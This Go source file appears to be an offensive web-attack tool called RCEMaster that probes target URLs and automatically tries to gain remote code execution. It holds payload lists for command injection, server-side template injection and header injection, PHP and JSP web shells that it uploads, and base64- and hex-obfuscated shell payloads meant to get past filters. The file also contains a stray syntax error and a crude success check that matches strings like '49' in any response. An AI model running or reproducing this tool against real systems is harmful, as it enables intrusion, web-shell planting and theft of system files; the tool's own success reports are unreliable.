package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64" // ✅ USED
	"encoding/hex"    // ✅ USED
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart" // ✅ USED
	"net/http"
	"net/url"
	"os"
	"regexp"         // ✅ USED
	"strings"
	"sync"           // ✅ USED
	"time"

	"github.com/fatih/color"
)

var banner = "  ____  _____ _____    __  __           _      \n" +
	" |  _ \\| ____|_   _|  |  \\/  | __ _ _ __ | |_ ___\n" +
	" | |_) |  _|   | |    | |\\/| |/ _` | '_ \\| __/ _ \\\n" +
	" |  _ <| |___  | |    | |  | | (_| | | | | ||  __/\n" +
	" |_| \\_\\_____| |_|    |_|  |_|\\__,_|_| |_|\\__\\___|\n" +
	"====================================================\n" +
	" [!] RCEMaster v5.0: Ultimate Unified Edition\n" +
	" [!] Smart Recon Engine | Auto-Endpoint Probing\n" +
	" [!] Cmd Injection | SSTI | Upload | Obfuscation\n" +
	"====================================================\n"

var (
	green  = color.New(color.FgGreen).SprintFunc()
	yellow = color.New(color.FgYellow).SprintFunc()
	cyan   = color.New(color.FgCyan).SprintFunc()
	red    = color.New(color.FgRed).SprintFunc()
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0",
}

func getRandomUA() string { return userAgents[rand.Intn(len(userAgents))] }

type TechStack struct{ Language, Framework, CMS, Server, WAF string }
type Result struct{ URL, Vector, Payload, Evidence, Confidence string; StatusCode int }
type ResponseInfo struct{ StatusCode int; Body string; Headers http.Header }

// --- PAYLOAD DATABASES (ALL RETAINED) ---
var commandInjectionPayloads = map[string][]string{
	"linux":   {";id", "|id", "&&id", "`id`", "$(id)", ";cat /etc/passwd", ";sleep 5", ";uname -a"},
	"windows": {"&whoami", "|whoami", "&&whoami", "&dir", "&ipconfig", "&type C:\\Windows\\win.ini"},
}

var sstiPayloads = map[string][]string{
	"jinja2":     {"{{7*7}}", "${7*7}", "{{config}}", "{{''.__class__.__mro__[2].__subclasses__()}}"},
	"twig":       {"{{7*7}}", "{{7*'7'}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"},
	"freemarker": {"${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\")}"},
}

var fileUploadWebshells = map[string][]string{
	"php": {"<?php system($_GET['cmd']); ?>", "<?=`$_GET[c]`?>", "<?php echo shell_exec('id'); ?>"},
	"jsp": {"<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"},
}

var headerBasedRCE = map[string][]string{
	"X-Forwarded-Host": {"{{7*7}}", ";id"},
	"X-Original-URL":   {"{{7*7}}", ";id"},
	"Referer":          {"{{7*7}}", ";id"},
	"User-Agent":       {"{{7*7}}", ";id"},
}

var wafSignatures = map[string]string{"cloudflare": "cloudflare", "akamai": "akamai", "aws": "aws"}

// --- SMART RECON ENDPOINTS (The Powerful Search Engine) ---
var reconEndpoints = []string{
	"/api/v1/search?q=test", "/search?query=test", "/admin/config", 
	"/upload", "/api/exec?cmd=test", "/v1/user?template=test",
}

func init() { rand.Seed(time.Now().UnixNano()) }

func main() {
	urlPtr := flag.String("u", "", "Single Target URL")
	filePtr := flag.String("f", "", "File containing list of URLs")
	outputPtr := flag.String("o", "", "Output file (e.g., results.json)")
	delayPtr := flag.Duration("delay", 0, "Delay between requests (e.g., 500ms)")
	proxyPtr := flag.String("proxy", "", "Proxy URL (e.g., http://127.0.0.1:8080)")
	flag.Parse()

	if *urlPtr == "" && *filePtr == "" {
		fmt.Printf("%s Usage: rcemaster -u <url> OR -f <urls.txt> [-delay 500ms]\n", red("[-] Error: Input required."))
		os.Exit(1)
	}

	fmt.Print(cyan(banner))

	var targets []string
	if *urlPtr != "" {
		targets = append(targets, *urlPtr)
	} else if *filePtr != "" {
		data, _ := os.ReadFile(*filePtr)
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line != "" && !strings.HasPrefix(line, "#") {
				targets = append(targets, line)
			}
		}
	}

	var allResults []Result
	for _, target := range targets {
		fmt.Printf("\n%s Target: %s\n", cyan("[*]"), yellow(target))
		
		// Phase 1: Ultra-Powered Smart Recon & Probing
		fmt.Printf("%s Phase 1: Smart Recon & Endpoint Probing...\n", cyan("[*]"))
		probeURL, techStack := smartRecon(target, *delayPtr, *proxyPtr)
		fmt.Printf("%s Detected Stack: %s %s | WAF: %s\n", green("[+]"), techStack.Language, techStack.CMS, techStack.WAF)
		fmt.Printf("%s Active Attack Vector: %s\n", cyan("[!]"), probeURL)

		// Phase 2: Adaptive RCE Attack
		fmt.Printf("%s Phase 2: Starting Adaptive RCE Attack...\n", cyan("[*]"))
		results := adaptiveRCEAttack(probeURL, techStack, *delayPtr, *proxyPtr)
		allResults = append(allResults, results...)
	}

	if len(allResults) > 0 {
		fmt.Println("\n" + cyan("========== 🎯 RCE SUCCESSFUL 🎯 =========="))
		for _, r := range allResults {
			fmt.Printf("[%s] %s\n", green("RCE"), r.URL)
			fmt.Printf("   -> Vector  : %s\n", yellow(r.Vector))
			fmt.Printf("   -> Payload : %s\n", cyan(r.Payload))
			fmt.Printf("   -> Evidence: %s\n\n", r.Evidence)
		}
		fmt.Println(cyan("================================================"))
	} else {
		fmt.Printf("\n%s No RCE vectors worked. Target is secure or lacks vulnerable entry points.\n", yellow("[-]"))
	}

	if *outputPtr != "" && len(allResults) > 0 {
		saveToFile(allResults, *outputPtr)
		fmt.Printf("%s Results saved to: %s\n", green("[+]"), *outputPtr)
	}
}

// --- ULTRA-POWERED SMART RECON ENGINE ---
func smartRecon(baseURL string, delay time.Duration, proxyURL string) (string, TechStack) {
	stack := TechStack{}
	bestURL := baseURL

	// 1. Check Base URL (Follow 1 redirect to get real destination)
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 1 { return http.ErrUseLastResponse }
			return nil
		},
	}
	
	req, _ := http.NewRequest("GET", baseURL, nil)
	req.Header.Set("User-Agent", getRandomUA())
	resp, err := client.Do(req)
	if err == nil {
		defer resp.Body.Close()
		server := strings.ToLower(resp.Header.Get("Server"))
		xPoweredBy := strings.ToLower(resp.Header.Get("X-Powered-By"))
		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
		body := strings.ToLower(string(bodyBytes))

		if strings.Contains(server, "php") || strings.Contains(xPoweredBy, "php") { stack.Language = "php" }
		if strings.Contains(server, "tomcat") || strings.Contains(xPoweredBy, "jsp") { stack.Language = "java" }
		if strings.Contains(xPoweredBy, "python") || strings.Contains(server, "wsgi") { stack.Language = "python" }
		if strings.Contains(body, "wp-content") { stack.CMS = "wordpress" }
		if resp.Header.Get("Cf-Ray") != "" { stack.WAF = "cloudflare" }
		
		// If base URL returned 200 OK and has a language, it's a good target
		if resp.StatusCode == 200 && stack.Language != "" {
			bestURL = baseURL
		}
	}

	// 2. If Base URL is static/secure, PROBE common vulnerable endpoints
	if stack.Language == "" || stack.WAF != "" {
		for _, endpoint := range reconEndpoints {
			probeURL := strings.TrimRight(baseURL, "/") + endpoint
			info := sendRequest(probeURL, "GET", nil, nil, delay, proxyURL)
			// If endpoint exists (not 404) and accepts input, mark it as bestURL
			if info.StatusCode != 404 && info.StatusCode != 403 {
				bestURL = probeURL
				// Try to infer language from this new endpoint's response
				if strings.Contains(strings.ToLower(info.Headers.Get("Content-Type")), "json") {
					stack.Language = "api" // Generic API target
				}
				break
		.}
		}
	}

	return bestURL, stack
}

func adaptiveRCEAttack(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result

	// 1. Command Injection
	results = append(results, tryCommandInjection(targetURL, stack, delay, proxyURL)...)
	
	// 2. SSTI
	if len(results) == 0 && stack.Language != "" {
		results = append(results, trySSTI(targetURL, stack, delay, proxyURL)...)
	}

	// 3. Header-Based RCE
	if len(results) == 0 {
		results = append(results, tryHeaderBasedRCE(targetURL, delay, proxyURL)...)
	}

	// 4. File Upload RCE
	if len(results) == 0 && (stack.Language == "php" || stack.Language == "java") {
		results = append(results, tryFileUploadRCE(targetURL, delay, proxyURL)...)
	}

	// 5. Advanced Obfuscation Fallback (The "Dark/Underground" Techniques)
	if len(results) == 0 {
		fmt.Printf("%s Standard methods blocked. Activating Advanced Obfuscation Engine...\n", yellow("[!]"))
		results = append(results, tryAdvancedObfuscation(targetURL, delay, proxyURL)...)
	}

	return results
}

func tryCommandInjection(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	payloads := commandInjectionPayloads["linux"]
	if stack.Language == "dotnet" || stack.Server == "iis" { payloads = commandInjectionPayloads["windows"] }

	for _, payload := range payloads {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			info := sendRequest(targetURL+p, "GET", nil, nil, delay, proxyURL)
			if isRCE(info, p) {
				mu.Lock()
				results = append(results, Result{URL: targetURL + p, Vector: "Command Injection", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
				mu.Unlock()
			}
		}(payload)
	}
	wg.Wait()
	return results
}

func trySSTI(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	for engine, payloads := range sstiPayloads {
		for _, payload := range payloads {
			wg.Add(1)
			go func(p, eng string) {
				defer wg.Done()
				// Try in query param
				info := sendRequest(targetURL+"?template="+url.QueryEscape(p), "GET", nil, nil, delay, proxyURL)
				if isRCE(info, p) {
					mu.Lock()
					results = append(results, Result{URL: targetURL + "?template=" + p, Vector: "SSTI (" + eng + ")", Payload: p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
					mu.Unlock()
				}
			}(payload, engine)
		}
	}
	wg.Wait()
	return results
}

func tryHeaderBasedRCE(targetURL string, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	for header, payloads := range headerBasedRCE {
		for _, payload := range payloads {
			wg.Add(1)
			go func(h, p string) {
				defer wg.Done()
				info := sendRequest(targetURL, "GET", map[string]string{h: p}, nil, delay, proxyURL)
				if isRCE(info, p) {
					mu.Lock()
					results = append(results, Result{URL: targetURL, Vector: "Header RCE", Payload: h + ": " + p, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "Medium"})
					mu.Unlock()
				}
			}(header, payload)
		}
	}
	wg.Wait()
	return results
}

func tryFileUploadRCE(targetURL string, delay time.Duration, proxyURL string) []Result {
	var results []Result
	shells := fileUploadWebshells["php"] // Default to PHP for testing

	for _, shell := range shells {
		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body) // ✅ mime/multipart USED
		part, _ := writer.CreateFormFile("file", "shell.php")
		part.Write([]byte(shell))
		writer.Close()

		headers := map[string]string{"Content-Type": writer.FormDataContentType()}
		info := sendRequest(targetURL, "POST", headers, body.Bytes(), delay, proxyURL)
		
		if isRCE(info, shell) {
			results = append(results, Result{URL: targetURL, Vector: "File Upload RCE", Payload: "shell.php", StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
		}
	}
	return results
}

func tryAdvancedObfuscation(targetURL string, delay time.Duration, proxyURL string) []Result {
	var results []Result
	var mu sync.Mutex
	var wg sync.WaitGroup

	baseCmds := []string{"id", "whoami", "cat /etc/passwd"}
	for _, cmd := range baseCmds {
		wg.Add(1)
		go func(c string) {
			defer wg.Done()
			obfuscatedList := obfuscatePayload(c)
			for _, obs := range obfuscatedList {
				info := sendRequest(targetURL+obs, "GET", nil, nil, delay, proxyURL)
				if isRCE(info, c) {
					mu.Lock()
					results = append(results, Result{URL: targetURL + obs, Vector: "Advanced Obfuscation", Payload: obs, StatusCode: info.StatusCode, Evidence: extractEvidence(info.Body), Confidence: "High"})
					mu.Unlock()
				}
			}
		}(cmd)
	}
	wg.Wait()
	return results
}

func obfuscatePayload(cmd string) []string {
	var payloads []string
	b64Cmd := base64.StdEncoding.EncodeToString([]byte(cmd)) // ✅ base64 USED
	payloads = append(payloads, fmt.Sprintf("$(echo %s | base64 -d | bash)", b64Cmd))
	
	hexCmd := hex.EncodeToString([]byte(cmd)) // ✅ hex USED
	if len(hexCmd) >= 4 {
		payloads = append(payloads, fmt.Sprintf("$(printf '\\x%s\\x%s' | sh)", hexCmd[0:2], hexCmd[2:4]))
	}
	payloads = append(payloads, fmt.Sprintf("cat${IFS}/etc/passwd"))
	payloads = append(payloads, fmt.Sprintf("a=c;b=at; $a$b /etc/passwd"))
	return payloads
}

func sendRequest(targetURL, method string, customHeaders map[string]string, body []byte, delay time.Duration, proxyURL string) ResponseInfo {
	if delay > 0 { time.Sleep(delay) }
	var req *http.Request
	var err error
	if body != nil {
		req, err = http.NewRequest(method, targetURL, bytes.NewReader(body))
	} else {
		req, err = http.NewRequest(method, targetURL, nil)
	}
	if err != nil { return ResponseInfo{} }

	req.Header.Set("User-Agent", getRandomUA())
	req.Header.Set("Accept", "*/*")
	for k, v := range customHeaders { req.Header.Set(k, v) }

	transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	if proxyURL != "" {
		proxyParsed, _ := url.Parse(proxyURL)
		transport.Proxy = http.ProxyURL(proxyParsed)
	}

	client := &http.Client{Timeout: 15 * time.Second, Transport: transport, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }}
	resp, err := client.Do(req)
	if err != nil { return ResponseInfo{} }
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 102400))
	return ResponseInfo{StatusCode: resp.StatusCode, Body: string(respBody), Headers: resp.Header}
}

func isRCE(info ResponseInfo, payload string) bool {
	indicators := []string{"uid=", "root:", "bin/bash", "bin/sh", "49", "Windows", "drwx", "total "}
	body := strings.ToLower(info.Body)
	for _, ind := range indicators {
		if strings.Contains(body, strings.ToLower(ind)) { return true }
	}
	return false
}

func extractEvidence(body string) string {
	re := regexp.MustCompile(`(?i)(uid=\d+.*|root:.*|bin/bash|bin/sh|49|drwx|total\s+\d+)`) // ✅ regexp USED
	match := re.FindString(body)
	if match != "" {
		if len(match) > 80 { return match[:80] + "..." }
		return match
	}
	return "RCE indicator found in response"
}

func saveToFile(results []Result, filename string) {
	file, _ := os.Create(filename)
	defer file.Close()
	jsonData, _ := json.MarshalIndent(results, "", "  ")
	file.Write(jsonData)
}
